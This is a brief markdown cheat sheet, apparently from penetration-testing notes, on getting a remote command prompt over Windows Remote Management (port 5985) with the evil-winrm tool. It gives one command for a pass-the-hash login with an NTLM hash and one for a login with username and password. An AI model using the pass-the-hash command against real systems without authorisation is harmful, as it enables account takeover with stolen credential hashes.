# Windows Remote Management

## Passing The Hash

_This will give us command prompt if port 5985 is open and user is allowed WinRM using Passing The Hash technique_

```
evil-winrm -i 127.0.0.1 -u username -H NTML_HASH
```

## Normal Login

_This will give us command prompt if port 5985 is open and user is allowed WinRM using normal username and password_

```
evil-winrm -i 127.0.0.1 -u username -p password
```
